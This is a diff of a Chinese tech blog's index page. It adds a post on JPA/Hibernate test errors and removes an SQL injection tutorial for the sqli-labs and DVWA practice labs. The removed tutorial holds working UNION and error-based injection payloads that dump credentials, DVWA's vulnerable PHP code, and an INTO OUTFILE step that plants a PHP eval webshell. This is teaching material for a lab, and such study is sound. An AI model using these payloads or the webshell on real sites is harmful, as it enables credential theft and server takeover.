@@ -62,6 +62,116 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-JPA初学问题总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/13/JPA初学问题总结/" class="article-date">
+  <time datetime="2020-04-13T13:04:54.234Z" itemprop="datePublished">2020-04-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JPA初学问题总结"><a href="#JPA初学问题总结" class="headerlink" title="JPA初学问题总结"></a>JPA初学问题总结</h1><hr>
+<p><strong>1.IDE无法解析junit和spring framework-test</strong></p>
+<p>  创建实体DAO的测试类时，按往常一样导入junit和spring framework-test的依赖。但是发现在测试类中导入相关的类时发现eclipse报错’cannot reslove …’，一开始纳闷导入的类都是正确的，为什么eclipse无法解析？原来是需要如下这样在项目的pom.xml文件中导入依赖</p>
+<!-- ============== test begin ============== -->
+<pre><code>&lt;dependency&gt;&lt;!-- JUnit单元测试框架 --&gt;
+    &lt;groupId&gt;junit&lt;/groupId&gt;
+    &lt;artifactId&gt;junit&lt;/artifactId&gt;
+    &lt;version&gt;4.12&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-test --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-test&lt;/artifactId&gt;
+    &lt;version&gt;5.1.6.RELEASE&lt;/version&gt;
+    &lt;scope&gt;provided&lt;/scope&gt;
+&lt;/dependency&gt;
+
+&lt;!-- ============== test end ============== --&gt;</code></pre><hr>
+<p><strong>2.junit test运行时报错</strong></p>
+<p>报错信息：</p>
+<pre><code>Caused by: org.hibernate.MappingException: Could not get constructor for org.hibernate.persister.entity.SingleTableEntityPersister
+at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:123) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:77) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.metamodel.internal.MetamodelImpl.initialize(MetamodelImpl.java:128) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.internal.SessionFactoryImpl.&lt;init&gt;(SessionFactoryImpl.java:300) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.boot.internal.SessionFactoryBuilderImpl.build(SessionFactoryBuilderImpl.java:460) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.jpa.boot.internal.EntityManagerFactoryBuilderImpl.build(EntityManagerFactoryBuilderImpl.java:892) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.springframework.orm.jpa.vendor.SpringHibernateJpaPersistenceProvider.createContainerEntityManagerFactory(SpringHibernateJpaPersistenceProvider.java:58) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.createNativeEntityManagerFactory(LocalContainerEntityManagerFactoryBean.java:365) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.buildNativeEntityManagerFactory(AbstractEntityManagerFactoryBean.java:391) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.afterPropertiesSet(AbstractEntityManagerFactoryBean.java:378) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.afterPropertiesSet(LocalContainerEntityManagerFactoryBean.java:341) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1855) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1792) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1108) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+...
+...25 more
+Caused by: org.hibernate.HibernateException: Unable to instantiate default tuplizer [org.hibernate.tuple.entity.PojoEntityTuplizer]
+at org.hibernate.tuple.entity.EntityTuplizerFactory.constructTuplizer(EntityTuplizerFactory.java:91) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.tuple.entity.EntityTuplizerFactory.constructDefaultTuplizer(EntityTuplizerFactory.java:116) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.tuple.entity.EntityMetamodel.&lt;init&gt;(EntityMetamodel.java:382) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.persister.entity.AbstractEntityPersister.&lt;init&gt;(AbstractEntityPersister.java:519) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.persister.entity.SingleTableEntityPersister.&lt;init&gt;(SingleTableEntityPersister.java:124) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[?:?]
+at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[?:?]
+at jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[?:?]
+at java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:500) ~[?:?]
+at java.lang.reflect.Constructor.newInstance(Constructor.java:481) ~[?:?]
+at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:96) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:77) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.metamodel.internal.MetamodelImpl.initialize(MetamodelImpl.java:128) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.internal.SessionFactoryImpl.&lt;init&gt;(SessionFactoryImpl.java:300) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.boot.internal.SessionFactoryBuilderImpl.build(SessionFactoryBuilderImpl.java:460) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.jpa.boot.internal.EntityManagerFactoryBuilderImpl.build(EntityManagerFactoryBuilderImpl.java:892) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.springframework.orm.jpa.vendor.SpringHibernateJpaPersistenceProvider.createContainerEntityManagerFactory(SpringHibernateJpaPersistenceProvider.java:58) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.createNativeEntityManagerFactory(LocalContainerEntityManagerFactoryBean.java:365) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.buildNativeEntityManagerFactory(AbstractEntityManagerFactoryBean.java:391) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+...
+... 25 more
+...</code></pre><p>最初还提示’org.springframework.beans.factory.BeanCreationException:’，我一开始以为是配置文件applicationContextTest-resources.xml的问题。一直在找是不是bean定义的问题。但是怎么改都这样。查了网上的资料才知道有可能不是配置文件的问题。’Caused by: org.hibernate.MappingException: Could not get constructor for org.hibernate.persister.entity.SingleTableEntityPersister’可能是有三种原因导致的。</p>
+<p>1.实体类属性没有get,set方法，或者get，set方法的格式不严谨</p>
+<p>右键source，选择’generate getter and setter’生成属性的get,set方法。但是检查了一下，发现我都是eclipse自动生成的get，set方法。格式是严格按照要求的，属性也都有get，set方法。但是每次运行测试类之前最好检查一下实体类属性的get,set方法</p>
+<p>2.没有导入需要的jar文件</p>
+<p>这里需要导入java-assist的jar文件，在pom中添加这个</p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+    &lt;version&gt;3.23.1-GA&lt;/version&gt;
+&lt;/dependency&gt;</code></pre><p>导入这个jar包后发现，不报错，说明需要导入这个jar包。</p>
+<p>3.实体属性名和映射文件的property name不一致</p>
+<p>这个的解决方法就是让实体属性名和映射文件property name一致就行了。</p>
+<hr>
+<p><strong>3.javax.net.ssl.SSLException</strong></p>
+<p>在stackflow上看到了解决方法，在jdbc配置文件（我这里是jdbc.properties）给url添加一个参数useSSL=false,不再报错。</p>
+<hr>
+<p>参考链接：<a href="https://stackoverflow.com/questions/18042247/could-not-get-constructor-for-org-hibernate-persister-entity-singletableentitype" target="_blank" rel="noopener">https://stackoverflow.com/questions/18042247/could-not-get-constructor-for-org-hibernate-persister-entity-singletableentitype</a></p>
+<p><a href="https://blog.51cto.com/zero01/2294152" target="_blank" rel="noopener">https://blog.51cto.com/zero01/2294152</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/13/JPA初学问题总结/" data-id="cky6tqd7k000kswv9gp6mdsjt" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-python序列化及反序列化" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/04/11/python序列化及反序列化/" class="article-date">
@@ -155,7 +265,7 @@ print(json.dumps(car, default=car2dict))</code></pre><p>##python序列化及反�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/04/11/python序列化及反序列化/" data-id="ckh65nt0a000cjsv9g7ex9xa0" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/04/11/python序列化及反序列化/" data-id="cky6tqd78000hswv9yzoti7g4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -285,7 +395,7 @@ event: worker_connections 每个进程允许的最大连接数
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/15/tie-san-webshell/" data-id="ckh65nt0j000jjsv9gh7f2mb3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/15/tie-san-webshell/" data-id="cky6tqd74000dswv933z58coy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -398,7 +508,7 @@ print(url)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/15/python-urllib/" data-id="ckh65nt0d000ejsv9lg3mpww6" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/15/python-urllib/" data-id="cky6tqd76000fswv9eqz7nrtm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -519,7 +629,7 @@ if __name__ == &apos;__main__&apos;:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/15/buuoj-Hack-World-easy-tornado/" data-id="ckh65nt040008jsv95yjx4whk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/15/buuoj-Hack-World-easy-tornado/" data-id="cky6tqd6u0005swv950qds4f2" class="article-share-link">Share</a>
       
       
     </footer>
@@ -715,7 +825,7 @@ return dp[s.length()-1]；
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/10/leetcode-dynamic-programming-2/" data-id="ckh65nt08000bjsv9uup8bqdg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/10/leetcode-dynamic-programming-2/" data-id="cky6tqd77000gswv99irir6hh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -901,7 +1011,7 @@ return dp[s.length()-1]；
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/08/leetcode-动态规划-2/" data-id="ckh65nt0f000gjsv9ipomsn5o" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/08/leetcode-动态规划-2/" data-id="cky6tqd72000bswv9bjydk99e" class="article-share-link">Share</a>
       
       
     </footer>
@@ -968,7 +1078,7 @@ Resource ：前面已经介绍过了，即指定资源文件，存的就是配�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/02/29/Metasploit学习笔记/" data-id="ckh65nszp0001jsv9h9j2ehf3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/02/29/Metasploit学习笔记/" data-id="cky6tqd6x0007swv9goobnecq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1166,7 +1276,7 @@ public int uniquePaths(int m, int n) {//n为行数，m为列数
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/02/25/leetcode-动态规划-1/" data-id="ckh65nt050009jsv93m17eyae" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/02/25/leetcode-动态规划-1/" data-id="cky6tqd75000eswv91ex2cqtb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1237,145 +1347,7 @@ print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/02/xss/" data-id="ckh65nt0h000hjsv95eicsfix" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-新文档" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/10/22/新文档/" class="article-date">
-  <time datetime="2019-10-22T06:54:32.862Z" itemprop="datePublished">2019-10-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="0x01sql语句基础："><a href="#0x01sql语句基础：" class="headerlink" title="#0x01sql语句基础："></a>#0x01sql语句基础：</h2><p><strong>1.select语句</strong></p>
-<p>格式：</p>
-<p>select * from table（从table表中获取字段信息）</p>
-<p> select * from table where (在满足where后的条件下查询字段信息)</p>
-<p><strong>2.insert语句</strong></p>
-<p>格式：</p>
-<p>insert into table(field1,field2) values(value1,value2)</p>
-<p><strong>3.update语句</strong></p>
-<p>格式：</p>
-<p>update table1 set field1=value1 where</p>
-<p><strong>4.delete语句</strong></p>
-<p>格式：</p>
-<p>delete from table1 where</p>
-<p><strong>5.order子句</strong></p>
-<p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p>
-<p>ORDER BY 语句默认按照升序对记录进行排序</p>
-<p>如果想要把结果集按照倒序，则需要加上desc关键字</p>
-<p>在sql注入中经常利用order by子句显示目标有多少字段</p>
-<p><strong>6.and和or运算符</strong></p>
-<p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。</p>
-<p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p>
-<p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p>
-<p>and 和 or的用处在万能密码中就可以体现出来：</p>
-<pre><code>Select * from admin where username=’admin’ and password=’’ or 1=1</code></pre><p>在sql语句中，and的优先级是大于or的。username=’admin’的条件（1）为真，password=’’的条件（2）是假的<br>那么1 and 2=false，在与第三个条件 1=1（3）为真 进行 false or 3=true，结果就是真。 所以，有时候在执行sql注入，执行的语句后就会加上 or 1=1，目的就是利用sql and 和 or 运算符的优先级的差别，来达到用户想要的目的（语句为真，执行输入的语句）</p>
-<h2 id="0x02什么是sql注入"><a href="#0x02什么是sql注入" class="headerlink" title="#0x02什么是sql注入?:"></a>#0x02什么是sql注入?:</h2><pre><code>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</code></pre><p>简单的说就是网页的后台没有对用户发送的语句（以参数的方式传递）进行过滤，使得用户发送的语句直接被sql解释器执行。</p>
-<h2 id="0x03原理分析："><a href="#0x03原理分析：" class="headerlink" title="#0x03原理分析："></a>#0x03原理分析：</h2><p>我们可以利用DVWA平台去分析sql注入的原理，DVWA的平台搭建和sqli-labs和upload-labs类似，首先需要php运行环境。把下载的文件夹放到网站根目录（WWW）。</p>
-<pre><code>&lt;?php
-
-if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
-    // Get input
-    $id = $_REQUEST[ &apos;id&apos; ];
-
-    // Check database
-    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
-    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
-
-    // Get results
-    while( $row = mysqli_fetch_assoc( $result ) ) {
-        // Get values
-        $first = $row[&quot;first_name&quot;];
-        $last  = $row[&quot;last_name&quot;];
-
-        // Feedback for end user
-        $html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
-    }
-
-    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
-}
-
-?&gt;</code></pre><p><img src="/%E6%8D%95%E8%8E%B73.png" alt></p>
-<p>如果用户在userid文本框输入ID，输入的语句就会作为id参数的值通过GET(POST)方法提交到后台。通过sql解释器执行，并返回数据库查询的结果。也就是说，如果id传入的不只是一个数字，而是一条语句那么id的值就会被sql解释器执行。例如，用户令id=1’ and 1=1 order by 4 #,那么$query就会变成</p>
-<pre><code>$query=&quot;SELECT first_name,last_name FROM users WHERE user_id=&apos;1&apos; and 1=1 order by 4#&quot;</code></pre><p>这样就能查询数据库信息了</p>
-<h1 id="0x05sqli-labs"><a href="#0x05sqli-labs" class="headerlink" title="0x05sqli-labs"></a>0x05sqli-labs</h1><hr>
-<p>sqli-labs是基于php环境的平台，使用前需要安装php集成环境（php+apache+mysql,部分关卡需要tomcat+java+mysql）。</p>
-<p>sqli-labs下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
-<p>这里还有一个sqli-labs原作者的教程：<a href="https://www.bilibili.com/video/av24783387?t=69" target="_blank" rel="noopener">https://www.bilibili.com/video/av24783387?t=69</a></p>
-<p><strong>下面结合sqli-labs上的一些基础题目来介绍一些简单的sql注入方式。</strong></p>
-<h1 id="0x06less01-联合查询"><a href="#0x06less01-联合查询" class="headerlink" title="0x06less01(联合查询)"></a>0x06less01(联合查询)</h1><hr>
-<p>在了解题目要求之前，我们先来认识一下sql语句中union操作符。</p>
-<p>union操作符的作用是合并多个select语句的结果集，但是使用union时，要保证union操作符内部的select语句要有相同的列</p>
-<p>具体语法：</p>
-<pre><code>select column1 from table1 union select column2 from table2</code></pre><p>注意：union操作符是不会返回相同的值。</p>
-<p>union all</p>
-<p>作用与union类似，都是合并多个select语句的结果集，但是可以返回重复的值。</p>
-<p>题目要求：让用户上传一个参数’id’。</p>
-<p><strong>1.判断注入点</strong></p>
-<p>首先我们要找到注入点，判断注入点的常用方法之一就是在参数后加上一个单引号或双引号（因为sql语句添加引号会影响到sql语句的闭合，从而报错），如果报错，就可能存在注入点。当然，手工判断注入点的方法还有利用and运算符（and 1=1,and 1=2 ,and ‘1’=1）,利用特殊字符报错等等，在这里，就不详细介绍了。</p>
-<p>通过尝试可以发现添加单引号后页面会有报错信息，说明页面存在注入点。</p>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MjE2NjMxLWY1NTlmNDUyMmUyYjQ0ZjMucG5n?x-oss-process=image/format,png" alt></p>
-<p>接下来就可以构造?id= 1’ ****语句实现注入了。</p>
-<p><strong>2.使用 order by子句判断数据库的列数</strong></p>
-<p>前面已经介绍了order by子句的作用，当order by子句后面的数字大于当前数据库的列数，语句就会出错。</p>
-<p>输入id=1’ order by 4–+发现页面返回信息 “unknown columns ‘4’” 说明当前数据库的列数是小于4的。</p>
-<p><img src="https://img-blog.csdnimg.cn/20191005170005919.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>输入id=1’ order by 3–+发现页面返回了用户的name password 说明当前数据库的列数刚好等于3，下面就可以构造 select 1，2，3 ***** 来获取数据库的相应信息了。</p>
-<p><strong>3.利用 information_schema库</strong></p>
-<p>如果继续学习sql注入就会发现select语句经常会用到information_schema这个库来获取数据库的（表，列，字段）的信息。information_schema是mysql自带的数据库，只要用户安装了mysql，在安装的同时，information<br>_schema这个数据库就会安装到用户的系统中.</p>
-<p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。也就是说information_schema中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。因此，在sql注入中就可以利用information_schema这个库获取其他数据库的信息.</p>
-<p>SCHEMATA表:</p>
-<p>SCHEMATA 表存储了 Mysql 数据库中所有库相关的信息，比如订单库、用户库这种不同的库。可以在mysql命令行中使用下述语句进行查看：</p>
-<p>select * from information_schema.schemata;</p>
-<p>TABLES表:<br>TABLES 表存储了 Mysql 数据库中表的信息。会记录这张表是属于哪个数据库(TABLE_SCHEMA)，是做什么的表(表注释)，多会创建的(CREATE_TIME)，有多少行数据(INDEX_LENGTH)等信息。</p>
-<p>select* frominformation_schema.TABLES;</p>
-<p>COLUMNS表:</p>
-<p>COLUMNS 表存储了 Mysql 数据库中每张表中的列信息。会记录这列是属于哪张表(TABLE_NAME)、以及哪个库(TABLE_SCHEMA)、这列的数据类型是什么、列的注释(COLUMN_COMMENT)等信息。</p>
-<p>select* frominformation_schema.COLUMNS<br>COLUMNS 表中字段 COLUMN_COMMENT 是关于列的注释信息，一般会标明这个列是什么字段，不同的数字代表什么含义(0代表什么、1代表什么)。</p>
-<p><strong>4.开始注入</strong></p>
-<p>获取数据库的名字:</p>
-<pre><code>?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+//group_concat()函数是把一组中的非NULL字符串合并为一个字符串的函数</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005181042833.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>获取security数据库的表名:</p>
-<pre><code>?id=-1&apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=&apos;security&apos;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005190150598.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>获取users表的列:</p>
-<pre><code>?id=-1&apos; union select 1,group_concat(column_name),3 from infromation_schema.columns where  table_name=&apos;users&apos;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/2019100519070977.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>获取username ,password:</p>
-<pre><code>?id=-1&apos; union select 1,group_concat(concat_ws(&apos;:&apos;,username,password)),3 from users--+//concat_ws函数是把一组非NULL字符串拼接为一个字符串，与concat函数相比主要不同是可以一次指定分隔符</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005190933714.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<h2 id="0x07less05报错注入"><a href="#0x07less05报错注入" class="headerlink" title="#0x07less05报错注入"></a>#0x07less05报错注入</h2><p>这关如果直接用联合查询的话,页面只会返回”You are in”,而不能返回数据库的信息。这时我们就可以尝试别的方法,比如时间注入,报错注入,布尔注入等等。在这一关可以使用报错注入来返回数据库的信息。</p>
-<p><strong>1报错注入的原理:</strong></p>
-<p>正常用户访问服务器发送id信息返回正确的id数据。报错注入是想办法构造语句，让错误信息中可以显示数据库的内容；如果能让错误信息中返回数据库中的内容，即实现SQL注入。</p>
-<p><strong>2.利用group by和rand()的冲突直接报错注入</strong></p>
-<p>group by的作用和order by的作用类似,都是对结果集排序(默认升序).而rand()是产生随机数的函数,类似于java的Math.random()。产生一个[0,1)区间的数.如rand()*2,则产生一个[0,2)区间的数。当rand() 和order by 在一起使用时，就会发生冲突。</p>
-<p>由于rand和order+by的冲突，即rand()是不可以作为order by的条件字段,同理 也不可以为group by的条件字段。floor(rand(0)*2) 获取不确定又重复的值造成mysql的错误</p>
-<p>rand和group by冲突的具体原因</p>
-<p><strong>3.开始注入</strong></p>
-<p>获取数据库的名字：</p>
-<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select database()),&apos;:&apos;,floor(rand()*2))a from information_schema.schemata group by a--+//</code></pre><p>其中concat函数的作用和之前group_concat()函数类似也是把一组非NULL字符串拼接为一个字符串。a是 as a的别名。然后返回值不能超过1行数据，所以如果里面的select获取的是多行数据时要加limit（查询多组用limit选择）</p>
-<p>获取表：</p>
-<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;:&apos;,floor(rand(0)*2))a from information_schema.tables  group by a--+</code></pre><p>获取列：</p>
-<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select column_name  from   information_schema.columns where table_name=&apos;users&apos;limit 0,1),&apos;:&apos;,floor(rand(0)*2))a from   information_schema.columns  group by a--+</code></pre><p>获取username， password:</p>
-<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select concat_ws(&apos;`&apos;,username,password) from users limit 0,1),&apos;:&apos;,floor(rand(0*2))) a from users group by a--+</code></pre><p>有关报错注入的方法还有很多，这里就不详细介绍了。</p>
-<h2 id="0x08less07上传一句话木马"><a href="#0x08less07上传一句话木马" class="headerlink" title="#0x08less07上传一句话木马"></a>#0x08less07上传一句话木马</h2><p>先在id=1后加上单引号和双引号，页面都显示正常，但是在参数后加上注释，会报错，说明系统过滤注释符。并且sql语句id参数前后很有可能加了（），尝试了很多次发现构造:“id’ =1 ))”,可以使注释不被过滤。</p>
-<p><img src="https://img-blog.csdnimg.cn/20191009171549118.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt><br>但是之后尝试 union,报错注入发现不能返回需要的信息（可以用布尔和时间盲注）。不过，本题提示利用file权限向服务器传入文件。那么，先看看是否能传入<br>构造语句：<br><a href="http://localhost/sqli-labs-master/Less-7/?id=1’" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-7/?id=1’</a>)) and (select count(*) from mysql.user)&gt;0–<br>返回正常说明我们有这个权限.<br><img src="https://img-blog.csdnimg.cn/20191009172804632.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt><br>然后把一句话木马发送到网页，构造语句：id=-1’)) union select 1,2,”&lt;?php</p>
-<p>@eval($_POST[‘shell’])?&gt; into outfile “<strong><strong>* \test.php” (**</strong></strong>为网页的目录,test.php为上传的一句话木马文件）。<br>连上中国菜刀，发现能够连接成功，说明注入成功（网页根目录有一句话木马说明上传成功）。</p>
-<h2 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h2>
-      
-    </div>
-    <footer class="article-footer">
